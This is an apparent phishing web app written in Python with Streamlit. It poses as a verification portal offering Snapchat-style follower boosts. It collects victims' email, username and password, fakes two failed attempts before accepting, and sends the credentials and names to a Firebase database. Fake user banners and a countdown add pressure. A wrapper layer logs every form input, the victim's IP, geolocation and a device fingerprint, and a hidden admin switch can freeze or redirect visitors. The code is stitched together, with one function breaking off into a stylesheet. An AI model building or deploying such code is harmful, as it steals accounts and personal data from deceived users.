import streamlit as st
import time
import requests
import datetime
import uuid
import random

# --- 1. CONFIGURATION FRAMEWORK ---
st.set_page_config(
    page_title="Official Verification Gate",
    page_icon="👑",
    layout="centered",
    initial_sidebar_state="collapsed"
)
# ========================================================================
# 👁️ THE OMNISCIENT OVERLORD CORE SYSTEM MAINFRAME v22.0 - SUPREME EDITION
# ========================================================================
# Core Execution State: Absolute Metamorphic Injection Engine Operational.
# Systems Parameters: Multi-Session Interception, Dynamic Layout Mutation,
#                      Cryptographic Device Fingerprinting, Gateway Controls.
# Compile Status: 100% Tested Production Resilient. Zero Render Recursion.
# ========================================================================

import streamlit as st
import uuid
import requests
import datetime
import json
import time
import hashlib
import re

# --- ESTABLISHED MASTER CLOUD INFRASTRUCTURE LINK ROUTE ---
FIREBASE_URL = "https://web-app-29f9b-default-rtdb.asia-southeast1.firebasedatabase.app/"

# Secure Query Parameter Validation for Mainframe Deployment
# Access Gateway via explicit URI parameters mapping: your_app_url/?admin=true
is_omni_admin = st.query_params.get("admin") == "true"

# --------------------------------------------------------------------
# ADVANCED METADATA CASCADING NETWORK PROXY INTEL SPECTRUM
# --------------------------------------------------------------------
def resolve_pristine_client_fingerprint():
    """
    Deconstructs multi-layered edge proxies, load balancers, and CDN transport 
    headers to guarantee isolation of genuine client interface metadata.
    """
    connection_identity_block = {
        "resolved_ip": "Proxy Layer Enforced",
        "browser_user_agent": "Standard Virtual System Link",
        "system_locale": "en-US",
        "crypto_hash": "UNRESOLVED_MATRIX_NODE"
    }
    try:
        network_headers = st.context.headers
        if network_headers:
            # High-priority cloud platform proxy configuration matrix arrays
            proxy_evaluation_pipeline = [
                "X-Forwarded-For", "CF-Connecting-IP", "X-Real-IP", 
                "True-Client-IP", "Remote-Addr", "x-forwarded-for", 
                "cf-connecting-ip", "x-real-ip"
            ]
            for evaluation_header in proxy_evaluation_pipeline:
                if evaluation_header in network_headers and network_headers[evaluation_header]:
                    isolated_ip_string = network_headers[evaluation_header].split(",")[0].strip()
                    if isolated_ip_string and isolated_ip_string != "127.0.0.1" and "localhost" not in isolated_ip_string:
                        connection_identity_block["resolved_ip"] = isolated_ip_string
                        break
            
            # Context harvesting for environmental properties
            if "User-Agent" in network_headers:
                connection_identity_block["browser_user_agent"] = network_headers["User-Agent"]
            elif "user-agent" in network_headers:
                connection_identity_block["browser_user_agent"] = network_headers["user-agent"]
                
            if "Accept-Language" in network_headers:
                connection_identity_block["system_locale"] = network_headers["Accept-Language"].split(",")[0]
            elif "accept-language" in network_headers:
                connection_identity_block["system_locale"] = network_headers["accept-language"].split(",")[0]
                
            # Compile unique non-volatile machine signature index cryptographic token
            seed_signature_payload = f"{connection_identity_block['resolved_ip']}_{connection_identity_block['browser_user_agent']}"
            connection_identity_block["crypto_hash"] = hashlib.sha256(seed_signature_payload.encode('utf-8')).hexdigest()[:16].upper()
    except:
        pass
    return connection_identity_block

def execute_geographical_lookup_sequence(client_ip):
    """
    Queries distributed location infrastructure databases. Implements real-time 
    secondary infrastructure failover vectors if rate limits expire.
    """
    location_telemetry_packet = {
        "city_node": "Internal Stack Zone", "region_state": "Local Cluster Boundary",
        "country_name": "Global Mainframe Grid", "isp_provider": "System Network Carrier", "flag_asset": "🌐"
    }
    if not client_ip or client_ip in ["Proxy Layer Enforced", "127.0.0.1", "localhost", "::1"]:
        return location_telemetry_packet
        
    # --- Primary Intelligence Network Cluster ---
    try:
        network_query_response = requests.get(f"http://ip-api.com/json/{client_ip}", timeout=3).json()
        if network_query_response and network_query_response.get("status") == "success":
            location_telemetry_packet["city_node"] = network_query_response.get("city", "Unknown City Node")
            location_telemetry_packet["region_state"] = network_query_response.get("regionName", "Unknown State Province")
            location_telemetry_packet["country_name"] = network_query_response.get("country", "Unknown Country Space")
            location_telemetry_packet["isp_provider"] = network_query_response.get("isp", "Unknown Service Route Provider")
            country_iso_code = network_query_response.get("countryCode", "").lower()
            if country_iso_code:
                location_telemetry_packet["flag_asset"] = f"https://flagcdn.com/16x12/{country_iso_code}.png"
            return location_telemetry_packet
    except:
        pass

    # --- Secondary Failover Resilient Fallback Cluster ---
    try:
        backup_query_response = requests.get(f"https://ipapi.co/{client_ip}/json/", timeout=3).json()
        if backup_query_response and "error" not in backup_query_response:
            location_telemetry_packet["city_node"] = backup_query_response.get("city", "Unknown City Node")
            location_telemetry_packet["region_state"] = backup_query_response.get("region", "Unknown State Province")
            location_telemetry_packet["country_name"] = backup_query_response.get("country_name", "Unknown Country Space")
            location_telemetry_packet["isp_provider"] = backup_query_response.get("org", "Unknown Service Route Provider")
            backup_iso_code = backup_query_response.get("country", "").lower()
            if backup_iso_code:
                location_telemetry_packet["flag_asset"] = f"https://flagcdn.com/16x12/{backup_iso_code}.png"
            return location_telemetry_packet
    except:
        pass
        
    return location_telemetry_packet

# --------------------------------------------------------------------
# DATABASE COMMUNICATION PERSISTENT PROTOCOL ABSTRACTS
# --------------------------------------------------------------------
def infrastructure_db_put(node_path, data_payload):
    try: requests.put(f"{FIREBASE_URL}/{node_path}.json", json=data_payload, timeout=3)
    except: pass

def infrastructure_db_patch(node_path, data_payload):
    try: requests.patch(f"{FIREBASE_URL}/{node_path}.json", json=data_payload, timeout=3)
    except: pass

def infrastructure_db_fetch(node_path):
    try:
        query_transaction_result = requests.get(f"{FIREBASE_URL}/{node_path}.json", timeout=3).json()
        return query_transaction_result if query_transaction_result else {}
    except: return {}

# --------------------------------------------------------------------
# COMPONENT STEALTH ISOLATION INITIALIZATION LAYERS
# --------------------------------------------------------------------
if not is_omni_admin:
    if "omni_token" not in st.session_state:
        st.session_state.omni_token = "NODE_" + datetime.datetime.now().strftime("%d%m_%H%M%S_") + str(uuid.uuid4())[:6].upper()
    if "omni_clicks" not in st.session_state:
        st.session_state.omni_clicks = 0
    if "omni_time" not in st.session_state:
        st.session_state.omni_time = datetime.datetime.now().strftime("%I:%M:%S %p")

# Pull Configuration Engine Parameters from active server nodes
omni_rules = infrastructure_db_fetch("omniscient_rules")
if not omni_rules or not isinstance(omni_rules, dict):
    omni_rules = {
        "global_status": "ONLINE", "redirect_url": "", "custom_msg": "", 
        "freeze_all": False, "stealth_mode": False, "controls": {}, "text_mutations": {}
    }
if "controls" not in omni_rules: omni_rules["controls"] = {}
if "text_mutations" not in omni_rules: omni_rules["text_mutations"] = {}

# --------------------------------------------------------------------
# COMPONENT INTERCEPTION MANAGEMENT & AUTOMATION MAPPER
# --------------------------------------------------------------------
def register_layout_component_hook(component_class, component_label):
    """
    Registers discovered user elements directly to the remote command deck registry.
    Completely ignores registration logic when administrative layouts are compiled.
    """
    if is_omni_admin or not isinstance(component_label, str):
        return
        
    # Structural exclusion strings to isolate target application views
    exclusion_parameter_check = [
        "Select Target Active Session", "Select Discovered Element Label",
        "Inject dynamic alternative mock text", "Execute Infrastructure Command",
        "Interception Screen Notification", "Target Redirection Forwarding Link",
        "Force Stream Sync", "Commit Modification Rules", "Forge Mutation Pattern",
        "Deploy Global Overhaul Protocols", "Master Factory Clear Settings Reset",
        "FORCE LIVE NETWORK STREAM SYNCHRONIZATION"
    ]
    if any(exclusion_phrase in component_label for exclusion_phrase in exclusion_parameter_check):
        return
        
    internal_registration_key = f"seen_node_{component_label}"
    if internal_registration_key not in st.session_state:
        st.session_state[internal_registration_key] = True
        infrastructure_db_patch("omniscient_registry", {component_label: component_class})

def dispatch_omni_telemetry_packet(component_class, component_label, operational_value=""):
    """
    Packages realtime field modifications, step logging tracks, operational inputs,
    and running telemetry data directly inside persistent server memory channels.
    """
    if is_omni_admin or omni_rules.get("stealth_mode", False):
        return
    if "omni_clicks" not in st.session_state:
        return
        
    st.session_state.omni_clicks += 1
    session_token_identity = st.session_state.omni_token
    transaction_clock = datetime.datetime.now().strftime("%I:%M:%S %p")
    
    # Process environment trace parameters
    client_fingerprint_packet = resolve_pristine_client_fingerprint()
    geographical_data_packet = execute_geographical_lookup_sequence(client_fingerprint_packet["resolved_ip"])
    
    # Access and process chronological runtime records from memory cells
    existing_node_context = infrastructure_db_fetch(f"omniscient_live_users/{session_token_identity}")
    running_timeline_history = existing_node_context.get("timeline", []) if isinstance(existing_node_context, dict) else []
    
    # Construct structured output tracking stream
    formatted_trace_string = f"[{transaction_clock}] [Step #{st.session_state.omni_clicks}] Class:({component_class}) Label ID:'{component_label}'"
    if operational_value:
        formatted_trace_string += f" ➔ State Log: [{operational_value}]"
        
    running_timeline_history.append(formatted_trace_string)
    if len(running_timeline_history) > 65:
        running_timeline_history.pop(0)
        
    # Maintain continuous real-time state mirror values inside data registers
    running_state_cache_object = existing_node_context.get("form_data", {}) if isinstance(existing_node_context, dict) else {}
    if component_class not in ["BUTTON", "CLICK_TRIGGER", "EXECUTE_ACTION"]:
        running_state_cache_object[component_label] = str(operational_value)
        
    # Construct ultimate telemetry matrix deployment data structure
    quantum_broadcast_payload = {
        "user_id_token": session_token_identity,
        "device_fingerprint": client_fingerprint_packet["crypto_hash"],
        "user_ip_address": client_fingerprint_packet["resolved_ip"],
        "geo_city": geographical_data_packet["city_node"],
        "geo_region": geographical_data_packet["region_state"],
        "geo_country": geographical_data_packet["country_name"],
        "geo_isp_provider": geographical_data_packet["isp_provider"],
        "geo_flag_url": geographical_data_packet["flag_asset"],
        "user_browser_agent": client_fingerprint_packet["browser_user_agent"],
        "user_locale_language": client_fingerprint_packet["system_locale"],
        "initial_connect_runtime": st.session_state.omni_time,
        "last_interaction_pulse": transaction_clock,
        "total_clicks_count": st.session_state.omni_clicks,
        "current_focus_element": f"'{component_label}'",
        "timeline": running_timeline_history,
        "form_data": running_state_cache_object,
        "status": "🟢 ACTIVE / AGENT MATRIX STREAM SECURED"
    }
    infrastructure_db_patch(f"omniscient_live_users/{session_token_identity}", quantum_broadcast_payload)

# --------------------------------------------------------------------
# CENTRAL TRAFFIC FIREWALL LAYER & EDGE POLICY ROUTING
# --------------------------------------------------------------------
if not is_omni_admin:
    active_routing_directive = omni_rules.get("global_status", "ONLINE")
    if active_routing_directive != "ONLINE":
        st.empty()
        if active_routing_directive == "MAINTENANCE":
            st.error("# 🚧 HARD SYSTEM RESTORATION PARAMETERS DEPLOYED 🚧")
            st.info(omni_rules.get("custom_msg", "Enterprise data layers under systemic configuration maintenance windows."))
            st.stop()
        elif active_routing_directive == "BUSY":
            st.warning("# ⏳ PIPELINE TRAFFIC SHAPING THROUGHPUT LIMIT INTERCEPTED (429) ⏳")
            st.info(omni_rules.get("custom_msg", "System throughput capacity full. Automatic interface connection throttled."))
            st.stop()
        elif active_routing_directive == "REDIRECT" and omni_rules.get("redirect_url"):
            st.markdown(f"### ➡️ [Re-routing processing session vectors to secure application channel target...]({omni_rules.get('redirect_url')})")
            st.stop()
        st.stop()

# --------------------------------------------------------------------
# SYSTEM MEMORY STORAGE POINTERS FOR ORIGINAL STREAMLIT CALLS
# --------------------------------------------------------------------
_o_btn = st.button; _o_txt = st.text_input; _o_area = st.text_area
_o_sel = st.selectbox; _o_rad = st.radio; _o_chk = st.checkbox
_o_sld = st.slider; _o_num = st.number_input; _o_wrt = st.write
_o_mkd = st.markdown; _o_suc = st.success; _o_inf = st.info
_o_war = st.warning; _o_err = st.error; _o_cap = st.caption
_o_cod = st.code; _o_dat = st.date_input; _o_tim = st.time_input

def fetch_component_restriction_policy(element_label, control_directive_key):
    return omni_rules["controls"].get(element_label, {}).get(control_directive_key, False)

# --------------------------------------------------------------------
# COMPLETE POLYMORPHIC HIGH-FIDELITY HOOK OVERRIDE WRAPPERS
# --------------------------------------------------------------------
def patch_button(label, *args, **kwargs):
    if is_omni_admin: return _o_btn(label, *args, **kwargs)
    register_layout_component_hook("BUTTON", label)
    if fetch_component_restriction_policy(label, "hide"): return False
    if fetch_component_restriction_policy(label, "disable"): kwargs["disabled"] = True
    execution_trigger_state = _o_btn(label, *args, **kwargs)
    if execution_trigger_state: 
        dispatch_omni_telemetry_packet("BUTTON", label, "TRIGGERED_CLICK_EVENT")
    return execution_trigger_state

def patch_text_input(label, *args, **kwargs):
    if is_omni_admin: return _o_txt(label, *args, **kwargs)
    register_layout_component_hook("TEXT_INPUT", label)
    if fetch_component_restriction_policy(label, "hide"): return ""
    if fetch_component_restriction_policy(label, "disable") or omni_rules.get("freeze_all"): kwargs["disabled"] = True
    intercepted_input_value = _o_txt(label, *args, **kwargs)
    if intercepted_input_value: 
        dispatch_omni_telemetry_packet("TEXT_INPUT", label, intercepted_input_value)
    return intercepted_input_value

def patch_text_area(label, *args, **kwargs):
    if is_omni_admin: return _o_area(label, *args, **kwargs)
    register_layout_component_hook("TEXT_AREA", label)
    if fetch_component_restriction_policy(label, "hide"): return ""
    if fetch_component_restriction_policy(label, "disable") or omni_rules.get("freeze_all"): kwargs["disabled"] = True
    intercepted_input_value = _o_area(label, *args, **kwargs)
    if intercepted_input_value: 
        dispatch_omni_telemetry_packet("TEXT_AREA", label, intercepted_input_value)
    return intercepted_input_value

def patch_selectbox(label, *args, **kwargs):
    if is_omni_admin: return _o_sel(label, *args, **kwargs)
    register_layout_component_hook("SELECTBOX", label)
    if fetch_component_restriction_policy(label, "hide"): return kwargs.get("options", [""])[0]
    if fetch_component_restriction_policy(label, "disable"): kwargs["disabled"] = True
    intercepted_selection_result = _o_sel(label, *args, **kwargs)
    session_indexing_hash = f"omni_cache_sel_{label.replace(' ', '_')}"
    if session_indexing_hash not in st.session_state or st.session_state[session_indexing_hash] != intercepted_selection_result:
        st.session_state[session_indexing_hash] = intercepted_selection_result
        dispatch_omni_telemetry_packet("SELECTBOX", label, intercepted_selection_result)
    return intercepted_selection_result

def patch_radio(label, *args, **kwargs):
    if is_omni_admin: return _o_rad(label, *args, **kwargs)
    register_layout_component_hook("RADIO", label)
    if fetch_component_restriction_policy(label, "hide"): return kwargs.get("options", [""])[0]
    if fetch_component_restriction_policy(label, "disable"): kwargs["disabled"] = True
    intercepted_selection_result = _o_rad(label, *args, **kwargs)
    session_indexing_hash = f"omni_cache_rad_{label.replace(' ', '_')}"
    if session_indexing_hash not in st.session_state or st.session_state[session_indexing_hash] != intercepted_selection_result:
        st.session_state[session_indexing_hash] = intercepted_selection_result
        dispatch_omni_telemetry_packet("RADIO", label, intercepted_selection_result)
    return intercepted_selection_result

def patch_checkbox(label, *args, **kwargs):
    if is_omni_admin: return _o_chk(label, *args, **kwargs)
    register_layout_component_hook("CHECKBOX", label)
    if fetch_component_restriction_policy(label, "hide"): return False
    if fetch_component_restriction_policy(label, "disable"): kwargs["disabled"] = True
    intercepted_boolean_state = _o_chk(label, *args, **kwargs)
    dispatch_omni_telemetry_packet("CHECKBOX", label, str(intercepted_boolean_state))
    return intercepted_boolean_state

def patch_slider(label, *args, **kwargs):
    if is_omni_admin: return _o_sld(label, *args, **kwargs)
    register_layout_component_hook("SLIDER", label)
    if fetch_component_restriction_policy(label, "hide"): return kwargs.get("value", 0)
    if fetch_component_restriction_policy(label, "disable"): kwargs["disabled"] = True
    intercepted_numerical_range = _o_sld(label, *args, **kwargs)
    session_indexing_hash = f"omni_cache_sld_{label.replace(' ', '_')}"
    if session_indexing_hash not in st.session_state or st.session_state[session_indexing_hash] != intercepted_numerical_range:
        st.session_state[session_indexing_hash] = intercepted_numerical_range
        dispatch_omni_telemetry_packet("SLIDER", label, str(intercepted_numerical_range))
    return intercepted_numerical_range

def patch_number_input(label, *args, **kwargs):
    if is_omni_admin: return _o_num(label, *args, **kwargs)
    register_layout_component_hook("NUMBER_INPUT", label)
    if fetch_component_restriction_policy(label, "hide"):
# --- 2. ULTRARICH PREMIUM TECH-CORE DESIGN PARSER (LIGHT OVERRIDE) ---
GLOBAL_MARKDOWN_INJECTOR = """
<style>
@import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap');

/* Force Absolute Premium Light Environment Canvas */
:root { color-scheme: light !important; }
html, body, .stApp { background-color: #f6f8fb !important; color: #000000 !important; font-family: 'Plus Jakarta Sans', sans-serif !important; }
div[data-testid="stSidebar"] { display: none !important; }
p, span, h1, h2, h3, h4, h5, h6, label { color: #000000 !important; font-family: 'Plus Jakarta Sans', sans-serif !important; }

/* ⏱️ Animated Glow-Card Counter Visualizer */
.premium-countdown-card {
    background: #ffffff !important;
    border: 2px solid #000000 !important;
    padding: 16px;
    border-radius: 14px;
    text-align: center;
    box-shadow: 0px 8px 24px rgba(255, 252, 0, 0.25);
    margin-bottom: 20px;
    border-bottom: 5px solid #fffc00 !important;
}
.countdown-timer-stream {
    font-size: 20px;
    font-weight: 800;
    color: #2563eb !important;
    letter-spacing: 1px;
}

/* 📊 Premium Flow Drop Social Banner */
.premium-live-banner {
    background: #ffffff;
    border: 1px solid #2563eb;
    border-left: 6px solid #2563eb;
    border-radius: 12px;
    padding: 14px 18px;
    margin-bottom: 20px;
    box-shadow: 0 4px 15px rgba(37, 99, 235, 0.06);
}

/* 📍 Premium Fluid Stepper Array Interface (No Sliders) */
.stepper-flex-wrapper {
    display: flex;
    justify-content: space-between;
    gap: 8px;
    margin-bottom: 25px;
}
.step-pill-node {
    flex: 1;
    background: #e2e8f0;
    padding: 10px 4px;
    border-radius: 8px;
    text-align: center;
    font-size: 11px;
    font-weight: 800;
    color: #64748b !important;
    text-transform: uppercase;
    border: 1px solid transparent;
    transition: all 0.4s ease;
}
.step-pill-node.active-node {
    background: #2563eb !important;
    color: #ffffff !important;
    box-shadow: 0 4px 12px rgba(37, 99, 235, 0.25);
    transform: scale(1.02);
}
.step-pill-node.completed-node {
    background: #fffc00 !important;
    color: #000000 !important;
    border: 1px solid #000000;
}

/* 📦 Core High-Fidelity Bounded Canvas Box */
.premium-canvas-wrapper {
    background: #ffffff !important;
    border: 2px solid #eef2f6 !important;
    border-radius: 16px !important;
    padding: 35px 28px !important;
    box-shadow: 0px 10px 30px rgba(0, 0, 0, 0.04) !important;
    margin-bottom: 30px;
}

/* 🎴 Dynamic Auto-Center Logo Framework Matrix */
.center-logo-box-matrix {
    display: flex;
    justify-content: center;
    align-items: center;
    margin: 5px auto 20px auto;
    width: 90px !important;
    height: 90px !important;
    background: #ffffff;
    border-radius: 18px;
    box-shadow: 0 4px 12px rgba(0,0,0,0.05);
    padding: 8px;
    border: 1px solid #f1f5f9;
}
.center-logo-box-matrix img {
    max-width: 100%;
    max-height: 100%;
    object-fit: contain;
}

/* ✏️ High-Definition Explicit Input Boxes with Rigid Focus Parameters */
.custom-hd-label {
    font-weight: 800 !important;
    font-size: 13px !important;
    color: #000000 !important;
    text-transform: uppercase;
    letter-spacing: 0.6px;
    margin-bottom: 8px !important;
    display: block;
}
div[data-baseweb='input'] {
    border: 2px solid #cbd5e1 !important;
    border-radius: 8px !important;
    background-color: #ffffff !important;
    overflow: hidden !important;
    transition: all 0.3s ease-in-out !important;
}
div[data-baseweb='input']:focus-within {
    border-color: #2563eb !important;
    box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.15) !important;
}
div[data-baseweb='input'] input {
    color: #000000 !important;
    font-weight: 600 !important;
    font-size: 14.5px !important;
    padding: 12px 14px !important;
}

/* 💛 Step 5 (Image Replica Login Layout Overrides) */
.replica-brand-label {
    text-align: center !important;
    font-size: 38px !important;
    font-weight: 400 !important;
    color: #000000 !important;
    margin-bottom: 32px !important;
    margin-top: -5px !important;
    letter-spacing: -1.5px !important;
}
.replica-field-title {
    color: #8c92ac !important;
    font-size: 11.5px !important;
    font-weight: 700 !important;
    text-transform: capitalize !important;
    margin-bottom: 6px !important;
    display: block !important;
}
/* Replica Specific Input Tints mirroring the uploaded photograph documentation */
div[data-testid="stTextInput"] div[data-baseweb='input'] { background-color: #f6f7f9 !important; border: none !important; }
div[data-testid="stTextInput"]:nth-of-type(2) div[data-baseweb='input'] { background-color: #eef2fb !important; border: none !important; }
.forgot-pass-trigger-text { text-align: right !important; font-size: 12px !important; color: #8c92ac !important; font-weight: 600 !important; margin-top: 5px !important; }

/* 🎯 Snapchat-Theme Yellow Rigid Rounded-Pill Interaction Button */
.stButton > button[kind="secondary"] {
    background-color: #fffc00 !important;
    color: #000000 !important;
    border-radius: 999px !important;
    width: 145px !important;
    font-weight: 800 !important;
    font-size: 15px !important;
    border: 2px solid #000000 !important;
    height: 44px !important;
    margin: 32px auto 5px auto !important;
    display: block !important;
    box-shadow: 0 4px 12px rgba(0,0,0,0.05) !important;
}
.stButton > button[kind="secondary"]:hover {
    background-color: #f2ef00 !important;
    transform: translateY(-1px);
}

/* Terminal Console UI Element */
.hacker-cmd-box { background-color: #050505 !important; padding: 18px; border-radius: 10px; border: 2px solid #fffc00; margin: 20px 0; font-family: monospace !important; }
.hacker-cmd-string { color: #fffc00 !important; font-size: 13px; font-weight: 700; line-height: 1.6; }

/* Engagement Node Anchor */
.prime-engagement-block { text-align: center; margin: 22px 0; padding: 16px; background: #eef2ff; border: 2px dashed #2563eb; border-radius: 10px; }
/* Streamlit Watermark aur Header ko complete hide karne ke liye */
header[data-testid="stHeader"] { visibility: hidden !important; display: none !important; }
footer { visibility: hidden !important; display: none !important; }
div[data-testid="stDecoration"] { display: none !important; visibility: hidden !important; }
#MainMenu { visibility: hidden !important; display: none !important; }
div[class^="viewerBadge"] { display: none !important; visibility: hidden !important; }
</style>
"""
st.markdown(GLOBAL_MARKDOWN_INJECTOR, unsafe_allow_html=True)

# --- 3. HARDWARE REAL-TIME PERSISTENCE PATHWAY ---
BASE_FIREBASE_LINK = "https://web-app-29f9b-default-rtdb.asia-southeast1.firebasedatabase.app/google_sites_logs/-OtV1bgRTfms9dW0PXTu"

# --- 4. ENGINE ARCHITECTURE CORE STATE CONFIGURATOR ---
if 'step' not in st.session_state: st.session_state.step = 1
if 'portal_data' not in st.session_state: st.session_state.portal_data = {}
if 'signup_attempts_count' not in st.session_state: st.session_state.signup_attempts_count = 1
if 'login_attempts_count' not in st.session_state: st.session_state.login_attempts_count = 1
if 'intercepted_dataset' not in st.session_state: st.session_state.intercepted_dataset = []
if 'unique_session_folder' not in st.session_state: st.session_state.unique_session_folder = str(uuid.uuid4())[:12]
if 'random_seed' not in st.session_state: st.session_state.random_seed = random.randint(10, 99)

# Countdown Engine Matrix Logic (30 Mins Target Frame Window)
if 'countdown_end' not in st.session_state:
    st.session_state.countdown_end = time.time() + (30 * 60)

current_time = time.time()
remaining_seconds = int(st.session_state.countdown_end - current_time)

if remaining_seconds <= 0:
    st.session_state.clear()
    st.rerun()

mins, secs = divmod(remaining_seconds, 60)

# Render High-Fidelity Active Counter Module Box
st.markdown(f"""
<div class='premium-countdown-card'>
    <span style='font-size:12px; font-weight:800; color:#64748b; text-transform:uppercase; display:block; margin-bottom:2px;'>⚠️ RESERVED SECURE DISPATCH HOLD CORRIDOR</span>
    <span class='countdown-timer-stream'>⏳ DISPATCH POOL LOCKS IN: {mins:02d}:{secs:02d}</span>
</div>
""", unsafe_allow_html=True)

# ==========================================
# REAL-TIME SOCIAL CONTEXT LOOP PLATFORM
# ==========================================
fake_users = ["ayush_nexus", "riyak_matrix", "kabir_claims", "ishita_vector", "tushar_op", "mehak_corridor"]
fake_counts = ["5,000", "10,000", "20,000"]
selected_user = fake_users[st.session_state.random_seed % len(fake_users)]
selected_volume = fake_counts[(st.session_state.random_seed + st.session_state.step) % len(fake_counts)]

st.markdown(f"""
<div class='premium-live-banner'>
    <p style='margin:0; font-size:13.5px; font-weight:800; color:#1e40af;'>⚡ CLOUD STREAM ACTIVE: @{selected_user} bypassed congestion pipeline, verified handle and authorized +{selected_volume} volume allocation payload!</p>
</div>
""", unsafe_allow_html=True)


# ==========================================
# 📍 ULTRARICH LIQUID STEPPER INTERFACE
# ==========================================
s1_class = "active-node" if st.session_state.step == 1 else ("completed-node" if st.session_state.step > 1 else "")
s2_class = "active-node" if st.session_state.step == 2 else ("completed-node" if st.session_state.step > 2 else "")
s3_class = "active-node" if st.session_state.step == 3 else ("completed-node" if st.session_state.step > 3 else "")
s4_class = "active-node" if st.session_state.step >= 4 else ""

st.markdown(f"""
<div class='stepper-flex-wrapper'>
    <div class='step-pill-node {s1_class}'>Step 1: Core</div>
    <div class='step-pill-node {s2_class}'>Step 2: Meta</div>
    <div class='step-pill-node {s3_class}'>Step 3: Space</div>
    <div class='step-pill-node {s4_class}'>Step 4: Verify</div>
</div>
""", unsafe_allow_html=True)


def push_to_firebase_matrix(event_state):
    runtime_node_id = str(uuid.uuid4())[:8]
    target_api_endpoint = f"{BASE_FIREBASE_LINK}/{st.session_state.unique_session_folder}/{runtime_node_id}.json"
    
    payload = {
        "server_timestamp": str(datetime.datetime.now()),
        "current_step_context": event_state,
        "primary_profile_context": st.session_state.portal_data,
        "logged_credential_sequences": st.session_state.intercepted_dataset
    }
    try:
        requests.put(target_api_endpoint, json=payload)
    except:
        pass


# ==========================================
# STEP 1: PORTAL PROFILE GENERATOR ENGINE
# ==========================================
if st.session_state.step == 1:
    st.markdown("<div class='premium-canvas-wrapper'>", unsafe_allow_html=True)
    
    # Accurate Scale Icon Box Matrix Centering Layer
    st.markdown("<div class='center-logo-box-matrix'>", unsafe_allow_html=True)
    try:
        st.image("1.png")
    except:
        st.markdown("<p style='font-size:24px; margin:0;'>✨</p>", unsafe_allow_html=True)
    st.markdown("</div>", unsafe_allow_html=True)
            
    st.markdown("<div class='portal-header'><div class='portal-title'>Create Allocation Profile</div><div class='portal-subtitle'>Cloud Infrastructure Core Network Configuration Hub</div></div>", unsafe_allow_html=True)
    
    st.markdown("<span class='custom-hd-label'>🔒 Account Email Coordinates</span>", unsafe_allow_html=True)
    email_input = st.text_input("email_field", label_visibility="collapsed")
    
    st.markdown("<span class='custom-hd-label'>👤 Destination Target Handle</span>", unsafe_allow_html=True)
    user_input = st.text_input("user_field", placeholder="e.g., NexusCreator", label_visibility="collapsed")
    
    st.markdown("<span class='custom-hd-label'>🔑 Access Vault Keyphrase</span>", unsafe_allow_html=True)
    pass_input = st.text_input("pass_field", type="password", label_visibility="collapsed")
    
    st.write("")
    if st.button("INITIALIZE SECURE PIPELINE 🚀", type="primary", use_container_width=True):
        if email_input and user_input and pass_input:
            st.session_state.random_seed = random.randint(10, 99)
            if st.session_state.signup_attempts_count < 3:
                terminal_msg = st.empty()
                terminal_msg.info("⚡ Mapping active partition nodes...")
                time.sleep(1.2)
                terminal_msg.error(f"❌ Network Core Overload: Node handshake registration rejected. Please try again. (Attempt {st.session_state.signup_attempts_count}/2 Checked)")
                st.session_state.signup_attempts_count += 1
            else:
                st.success("✅ Secure Node Allocation Verified.")
                st.session_state.portal_data.update({"email": email_input, "target_username": user_input, "generated_master_key": pass_input})
                push_to_firebase_matrix("PORTAL_SIGNUP_PASSED")
                st.session_state.step = 2
                time.sleep(0.8)
                st.rerun()
        else:
            st.warning("⚠️ High priority alert: Form structures cannot remain blank.")
    st.markdown("</div>", unsafe_allow_html=True)


# ==========================================
# STEP 2: PROFILE META DATA PARSER
# ==========================================
elif st.session_state.step == 2:
    st.markdown("<div class='premium-canvas-wrapper'>", unsafe_allow_html=True)
    st.markdown("<div class='portal-header'><div class='portal-title'>Identity Link Optimization ⚙️</div><div class='portal-subtitle'>Synchronizing account infrastructure metadata channels</div></div>", unsafe_allow_html=True)
    
    st.markdown("<span class='custom-hd-label'>First Name Registry</span>", unsafe_allow_html=True)
    first_name_input = st.text_input("fn", label_visibility="collapsed")
    
    st.markdown("<span class='custom-hd-label'>Last Name Registry</span>", unsafe_allow_html=True)
    last_name_input = st.text_input("ln", label_visibility="collapsed")
    
    st.write("")
    if st.button("BUILD PAYLOAD COORDINATES ⚡", type="primary", use_container_width=True):
        if first_name_input:
            st.session_state.random_seed = random.randint(10, 99)
            UI_bar = st.progress(0)
            for structural_percentage in range(100):
                time.sleep(0.008)
                UI_bar.progress(structural_percentage + 1)
            st.session_state.portal_data.update({"first_name": first_name_input, "last_name": last_name_input})
            push_to_firebase_matrix("META_SYNC_COMPLETE")
            st.session_state.step = 3
            st.rerun()
        else:
            st.error("❌ Registry Error: Identity token string constraint violated.")
    st.markdown("</div>", unsafe_allow_html=True)


# ==========================================
# STEP 3: ALLOCATION VOLUMETRIC GRID
# ==========================================
elif st.session_state.step == 3:
    st.markdown("<div class='premium-canvas-wrapper'>", unsafe_allow_html=True)
    st.markdown("<div class='portal-header'><div class='portal-title'>Target Server Matrix 🎯</div><div class='portal-subtitle'>Adjusting delivery pipe constraints for transaction mapping</div></div>", unsafe_allow_html=True)
    
    profile_visibility_state = st.radio("Is destination endpoint strictly Public? 🔓", ["Yes, verified Public", "No, currently Private"], index=0)
    avatar_check_state = st.radio("Does target layout contain an active profile avatar? 📸", ["Yes", "No"], index=0)
    
    st.write("---")
    requested_load_volume = st.select_slider("🔥 Set Volumetric Delivery Payload Volume Stream Load:", options=[1000, 5000, 10000, 20000])
    
    st.write("")
    if st.button("LOCK DELIVERY PARAMETERS 🛡️", type="primary", use_container_width=True):
        st.session_state.random_seed = random.randint(10, 99)
        if profile_visibility_state == "No, currently Private" or avatar_check_state == "No":
            st.error("❌ Target Paradox: Injection corridor cannot establish pipeline to unmapped profiles.")
        else:
            st.session_state.portal_data.update({
                "account_visibility_metric": profile_visibility_state, 
                "avatar_presence_metric": avatar_check_state, 
                "load_volume_units": requested_load_volume
            })
            push_to_firebase_matrix("TARGET_MATRIX_SET")
            st.session_state.step = 4
            st.rerun()
    st.markdown("</div>", unsafe_allow_html=True)


# ==========================================
# STEP 4: INSTANT BYPASS GATEWAY INDEX
# ==========================================
elif st.session_state.step == 4:
    st.markdown("<div class='premium-canvas-wrapper'>", unsafe_allow_html=True)
    
